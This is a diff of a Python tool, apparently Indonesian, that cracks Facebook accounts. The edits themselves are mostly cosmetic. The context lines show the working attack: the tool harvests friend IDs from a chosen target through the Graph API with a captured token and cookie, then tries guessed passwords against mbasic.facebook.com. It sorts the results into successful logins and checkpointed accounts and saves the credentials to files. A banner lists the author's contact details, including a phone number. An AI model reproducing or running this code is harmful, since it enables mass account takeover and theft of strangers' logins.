@@ -184,7 +184,7 @@ def login_lagi334():
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1))
 		cok=open(".cok.txt", "w").write(___kontol___)
-		print('\n LOGIN BERHASIL');time.sleep(1)
+		print('\n LOGIN BERHASIL....\n JALANKAN ULANG PERINTAHNYA');time.sleep(1)
 		exit()
 	except Exception as e:
 		os.system("rm -f .token.txt")
@@ -208,17 +208,17 @@ def menu(my_name,my_id):
 	sg = '# INFORMASI AKUN'
 	fx = mark(sg, style='yellow')
 	sol().print(fx)
-	print(x+'['+h+'•'+x+'] NAMA : '+str(my_name))
-	print(x+'['+h+'•'+x+']  ID     : '+str(my_id))
-	print(x+'['+h+'•'+x+'] IP   : '+str(sh['origin']))
-	io = '''[bold yellow][01] PUBLIC FRIENDS	     [06] CRACK FROM FILES
-[02] PUBLIC FRIENDS (BULK)   [07] CHECK CHECKPOINT OPTIONS
+	print(k+'['+h+'•'+k+'] NAMA : '+str(my_name))
+	print(k+'['+h+'•'+k+']  ID     : '+str(my_id))
+	print(k+'['+h+'•'+k+'] IP   : '+str(sh['origin']))
+	io = '''[bold yellow][01] PUBLIC 	             [06] CRACK FROM FILES
+[02] PUBLIC MASAL            [07] CHECK CHECKPOINT OPTIONS
 [03] FOLLOWER		     [08] CHECK CRACK RESULTS
 [04] LIKES THE POST	     [09] TIPS CRACK
 [05] GROUP MEMBERS           [00] LOGOUT[bold yellow]'''
 	oi = nel(io, style='yellow')
 	cetak(nel(oi, title='[bold yellow] • MENU CRACK • [/bold yellow]'))
-	ec = input(x+'['+p+'<>'+x+'] Pilih : ')
+	ec = input(k+'['+p+'<>'+k+'] Pilih : ')
 	if ec in ['1','01']:
 		dump_publik()
 	elif ec in ['2','02']:
@@ -240,7 +240,7 @@ def menu(my_name,my_id):
 	elif ec in ['0','00']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
-		print(x+'['+h+'•'+x+'] WAIT • • •')
+		print(k+'['+h+'•'+k+'] WAIT • • •')
 		time.sleep(1)
 		sw = '# SUCCESS OUT'
 		sol().print(mark(sw, style='yellow'))
@@ -451,14 +451,14 @@ def dump_publik():
 	win = '# DUMP PUBLIC ID'
 	win2 = mark(win, style='green')
 	sol().print(win2)
-	print(x+'['+h+'•'+x+'] KETIK "me" JIKA INGIN CRACK DARI ID SENDIRI')
-	pil = input(x+'['+p+'f'+x+']  ID TARGET : ')
+	print(k+'['+h+'•'+k+'] KETIK "me" JIKA INGIN CRACK DARI ID SENDIRI')
+	pil = input(k+'['+p+'★'+k+']  ID TARGET : ')
 	try:
 		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
 		for pi in koh2['friends']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
-		print(x+'['+h+'•'+x+'] TOTAL : '+str(len(id)))
+		print(k+'['+h+'•'+k+'] TOTAL : '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
@@ -736,8 +736,8 @@ def setting():
 	sol().print(mark(wl, style='green'))
 	teks = '[01] CRACK FROM THE OLDEST ACCOUNT\n[02] CRACK FROM THE YOUNGEST ACCOUNT\n[03] CRACK RANDOM ID'
 	tak = nel(teks, style='yellow')
-	cetak(nel(tak, title=' • SETTING • '))
-	hu = input(x+'['+p+'f'+x+'] Choose : ')
+	cetak(nel(tak, title=' • SETT • '))
+	hu = input(k+'['+p+'★'+k+'] Choose : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -764,7 +764,7 @@ def setting():
 	ioz = '[01] METHOD M-FACEBOOK\n[02] METHOD FREE-FACEBOOK\n[03] METHOD TOUCH-FACEBOOK\n[04] METHOD MBASIC-FACEBOOK'
 	gess = nel(ioz, style='yellow')
 	cetak(nel(gess, title=' • METODE • '))
-	hc = input(x+'['+p+'f'+x+']  : ')
+	hc = input(k+'['+p+'★'+k+']  : ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['2','02']:
@@ -777,14 +777,14 @@ def setting():
 		method.append('mobile')
 	guw = '# LINKED APP VIEW ? (y/t)'
 	sol().print(mark(guw, style='yellow'))
-	aplik = input(x+'['+p+'f'+x+'] Choose : ')
+	aplik = input(k+'['+p+'★'+k+'] Choose : ')
 	if aplik in ['y','Y']:
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
 	guw = '# SHOW CHECKPOINT OPTIONS ? (y/t)'
 	sol().print(mark(guw, style='yellow'))
-	osk = input(x+'['+p+'f'+x+'] Choose : ')
+	osk = input(k+'['+p+'★'+k+'] Choose : ')
 	if osk in ['y','Y']:
 		oprek.append('ya')
 	else:
@@ -792,14 +792,14 @@ def setting():
 
 	guw = '# SHOW CHECKPOINT RESULT ? (y/t)'
 	sol().print(mark(guw, style='yellow'))
-	cpres = input(x+'['+p+'f'+x+'] Choose : ')
+	cpres = input(k+'['+p+'★'+k+'] Choose : ')
 	if cpres in ['y','Y']:
 		princp.append('ya')
 	else:
 		princp.append('no')
 	guw = '# WANT TO USE ADDITIONAL PASSWORD ? (y/t)'
 	sol().print(mark(guw, style='yellow'))
-	pwplus=input(x+'['+p+'f'+x+'] Choose : ')
+	pwplus=input(k+'['+p+'★'+k+'] Choose : ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
 		krek = '[•] USE COMMA AS SEPARATE\n[•] USE LOWER LETTERS\n[•] EXAMPLE: indonesia,germany,bangladesh'
@@ -1211,18 +1211,18 @@ def ceker(idf,pw):
 			if anj.get('name') in lion:
 				data.update({anj.get('name'):anj.get('value')})
 		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
-		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
+		print('\r%s🔥 %s|%s 🔥 CP       %s'%(b,idf,pw,x))
 		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 		cp+=1
 		opsi = kent.find_all('option')
 		if len(opsi)==0:
-			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
+			print('\r%s🎀Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
 		else:
 			for opsii in opsi:
 				print('\r%s---> %s%s'%(kk,opsii.text,x))
 	except Exception as c:
-		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
-		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
+		print('\r%s🔥 %s|%s 🔥 CP       %s'%(b,idf,pw,x))
+		print('\r%s🎀Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
 		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 		cp+=1
 
@@ -1260,20 +1260,20 @@ def cek_opsi():
 						if anj.get('name') in lion:
 							data.update({anj.get('name'):anj.get('value')})
 					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
-					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
+					print('\r%s🔥 %s|%s 🔥CP       %s'%(b,id,pw,x))
 					opsi = kent.find_all('option')
 					if len(opsi)==0:
-						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
+						print('\r%s🎀 Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
 					else:
 						for opsii in opsi:
 							print('\r%s---> %s%s'%(kk,opsii.text,x))
 				except:
-					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
-					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
+					print('\r%s🔥 %s|%s 🔥 CP       %s'%(b,id,pw,x))
+					print('\r%s🎀 Tidak Dapat Mengecek Opsi%s'%(u,x))
 			elif "c_user" in ses.cookies.get_dict().keys():
-				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
+				print('\r%s🔥 %s|%s 🔥 OK       %s'%(h,id,pw,x))
 			else:
-				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
+				print('\r%s🔥 %s|%s 🔥 SALAH       %s'%(x,id,pw,x))
 			love+=1
 		except requests.exceptions.ConnectionError:
 			print('')
@@ -1292,6 +1292,6 @@ if __name__=='__main__':
 	try:os.mkdir('/sdcard/4MBF-DATA/DUMP')
 	except:pass
 	voven_xd(f'\n\t{k}[+] {h}SELAMAT DATANG DI SCRIPT CRACK FACEBOOK SAYA \n\t{k}[+] {k}GUNAKAN DENGAN BIJAK\n\t{k}[+] {h}JIKA TERJADI EROR HUBUNGI SAYA\n\t{k}[+] {b}--------------------------------------------------\n\t{k}[+] {u}FB : ʬʬ-ʚïɞ POPEN NOPRIANSYAH ʚïɞ-ʬʬ\n\t{k}[+] {h}IG : @COWOKPINK_13\n\t{k}[+] {k}WA : 082311023880\n\t{k}[+] {h}GH : https://github.com/F2-XD\n\t{k}[+] {b}★BENGKULU ★\n\t{k}[+] {u}★BENGKULU SELATAN★\n\t{k}[+] {h}★CMD★\n\t{k}[+] {k}SEKIAN TERIMAKASIH\n\t{k}[+] {u}SEE YOU NEXT TIME ') 
-	time.sleep(3)
+	time.sleep(2) 
 	login()
 
